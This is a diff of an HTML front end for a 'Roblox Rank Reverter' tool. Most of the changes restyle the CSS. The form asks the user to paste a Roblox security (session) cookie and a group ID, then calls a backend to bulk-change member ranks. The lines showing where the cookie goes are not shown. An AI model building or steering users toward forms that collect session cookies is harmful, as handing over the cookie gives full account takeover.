@@ -7,113 +7,84 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
   <style>
     :root {
-      --primary-color: #3b82f6;
-      --background-color: #0f172a;
-      --surface-color: #1e293b;
-      --text-color: #f8fafc;
-      --input-bg: #334155;
-      --input-border: #475569;
-      --input-focus: #3b82f6;
-      --button-bg: #3b82f6;
-      --button-bg-hover: #2563eb;
-      --shadow: rgba(0, 0, 0, 0.1);
+      --primary: #4f46e5;
+      --secondary: #6366f1;
+      --background: #1a1a1a;
+      --foreground: #f9fafb;
+      --border-radius: 0.75rem;
+      --transition: 0.3s ease;
     }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       font-family: 'Inter', sans-serif;
-      background-color: var(--background-color);
-      color: var(--text-color);
+      background-color: var(--background);
+      color: var(--foreground);
+      margin: 0;
+      padding: 0;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      background-color: #111;
+      border-radius: var(--border-radius);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
       padding: 2rem;
-      gap: 1.5rem;
-    }
-
-    h1 {
-      font-size: 2rem;
-      font-weight: 600;
-      color: var(--primary-color);
-      text-align: center;
-      margin-bottom: 1rem;
-    }
-
-    input, select, button {
       width: 100%;
       max-width: 400px;
-      padding: 0.8rem;
-      border-radius: 0.5rem;
-      border: 1px solid var(--input-border);
-      background-color: var(--input-bg);
-      color: var(--text-color);
-      font-size: 1rem;
-      outline: none;
-      transition: all 0.3s ease;
+      text-align: center;
     }
-
-    input:focus, select:focus {
-      border-color: var(--input-focus);
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+      color: var(--primary);
     }
-
-    button {
-      background-color: var(--button-bg);
-      border: none;
-      cursor: pointer;
-      font-weight: 500;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: var(--button-bg-hover);
-    }
-
-    select {
-      display: none;
-    }
-
-    .log {
+    input, select, button {
       width: 100%;
-      max-width: 600px;
-      background-color: var(--surface-color);
+      padding: 0.8rem;
+      margin: 0.8rem 0;
+      border: none;
+      border-radius: var(--border-radius);
+      font-size: 1rem;
+      background-color: #333;
+      color: var(--foreground);
+      transition: var(--transition);
+    }
+    input:focus, select:focus, button:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px var(--secondary);
+    }
+    button {
+      background-color: var(--primary);
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: var(--secondary);
+    }
+    .log {
+      margin-top: 1.5rem;
       padding: 1rem;
-      border-radius: 0.5rem;
+      background-color: #222;
+      border-radius: var(--border-radius);
+      font-family: monospace;
       white-space: pre-wrap;
-      word-wrap: break-word;
-      font-size: 0.9rem;
-      line-height: 1.4;
-      box-shadow: 0 4px 6px var(--shadow);
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .visible {
-      display: block;
+      max-height: 200px;
+      overflow-y: auto;
     }
   </style>
 </head>
 <body>
-  <h1>🔁 Roblox Rank Reverter</h1>
-
-  <input id="cookie" type="text" placeholder="🔑 Security Cookie" />
-  <input id="groupId" type="number" placeholder="👥 Group ID" />
-  <button onclick="fetchRoles()">📥 Fetch Roles</button>
-
-  <select id="currentRankId" class="hidden"></select>
-  <select id="newRankId" class="hidden"></select>
-
-  <button onclick="startRevert()">🚀 Start Revert</button>
-
-  <div id="log" class="log"></div>
+  <div class="container">
+    <h1>🔁 Roblox Rank Reverter</h1>
+    <input id="cookie" type="text" placeholder="🔑 Security Cookie" />
+    <input id="groupId" type="number" placeholder="👥 Group ID" />
+    <button onclick="fetchRoles()">📥 Fetch Roles</button>
+    <select id="currentRankId" style="display:none;"></select>
+    <select id="newRankId" style="display:none;"></select>
+    <button onclick="startRevert()">🚀 Start Revert</button>
+    <div id="log" class="log"></div>
+  </div>
 
   <script>
     async function fetchRoles() {
@@ -133,10 +104,10 @@
         const currentSelect = document.getElementById('currentRankId');
         const newSelect = document.getElementById('newRankId');
 
-        currentSelect.classList.remove('hidden');
-        newSelect.classList.remove('hidden');
-        currentSelect.innerHTML = '<option disabled selected>🎯 Select current rank</option>';
-        newSelect.innerHTML = '<option disabled selected>↩️ Select new rank</option>';
+        currentSelect.style.display = 'block';
+        newSelect.style.display = 'block';
+        currentSelect.innerHTML = '<option disabled selected>🎯 Select Current Rank</option>';
+        newSelect.innerHTML = '<option disabled selected>↩️ Select New Rank</option>';
 
         data.forEach(role => {
           const option = document.createElement('option');
@@ -148,7 +119,7 @@
 
         log.textContent = '✅ Roles fetched successfully!';
       } catch (err) {
-        log.textContent = `💀 Error: ${err.message}`;
+        log.textContent = `💥 Error: ${err.message}`;
       }
     }
 
@@ -175,12 +146,12 @@
 
         const data = await res.json();
         if (data.success) {
-          log.textContent = `✅ Reverted ${data.count} users\n\n${data.logs.join('\n')}`;
+          log.textContent = `✅ Reverted ${data.count} users\n\n${data.logs?.join('\n') || ''}`;
         } else {
           log.textContent = `❌ Error: ${data.error}`;
         }
       } catch (err) {
-        log.textContent = `💥 Backend error: ${err.message}`;
+        log.textContent = `💥 Error: ${err.message}`;
       }
     }
   </script>
